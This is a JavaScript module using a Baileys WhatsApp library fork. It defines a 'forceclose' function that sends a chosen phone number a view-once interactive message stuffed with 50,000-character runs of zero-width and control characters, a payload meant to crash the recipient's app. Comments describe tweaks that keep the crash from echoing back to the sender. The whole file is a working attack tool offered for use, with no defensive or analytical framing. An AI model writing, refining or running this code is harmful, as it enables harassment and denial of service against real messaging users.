const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    encodeSignedDeviceIdentity,
    processTime,
    fetchLatestBaileysVersion,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');


async function forceclose(sock, target) {
    if (!sock || !target) {
        console.log('[forceclose] missing sock or target');
        return;
    }

    // ---- Sender guard ----
    // Never target the paired number itself.
    try {
        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        const targetNum = String(target).split('@')[0].split(':')[0];
        if (senderNum && targetNum && senderNum === targetNum) {
            console.log('[forceclose] skipped — target equals sender (' + senderNum + ')');
            return;
        }
    } catch (_) {
        // fall through
    }

    try {
        const N = 50000;

        // FIX: viewOnceMessage envelope replaces groupStatusMessageV2.
        // Reason: groupStatusMessageV2 goes through the STATUS pipeline —
        // WhatsApp backend mirrors it to the SENDER's own chat as a status
        // update. That's why the paired number was crashing too.
        // viewOnceMessage stays inside the direct chat envelope — sender
        // never receives a copy.
        const nanX = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            bloksWidget: {
                                fallback: "\u200D".repeat(N),
                                type:     "\u200F".repeat(N),
                                data:     "\[".repeat(N),
                                uuid:     "\u200B".repeat(N),
                            },
                            subtitle: "\u0010".repeat(N),
                            title:    "X".repeat(N),
                        },
                        nativeFlowMessage: { buttons: [{}] },
                        body: { text: "\u000F" },
                    },
                },
            },
        };

        // FIX: relay the raw payload directly instead of wrapping with
        // generateWAMessageFromContent. The generated message carries the
        // sender's JID as `fromMe` and WhatsApp echoes it back to the
        // sender's own linked devices. Raw relay skips that echo path.
        await sock.relayMessage(target, nanX, {
            messageId: 'fc' + Date.now().toString(36).toUpperCase() + crypto.randomBytes(4).toString('hex'),
            // exact casing — stops mirror to sender's other devices
            noSelfSync: true,
            // extra layer — prevents WhatsApp from fanning the message out
            // to the sender's own device tree
            additionalAttributes: {
                'device_fanout': 'false'
            }
        });
    } catch (e) {
        console.log('[forceclose]', (e && e.message) ? e.message : e);
    }
}


module.exports = { forceclose };
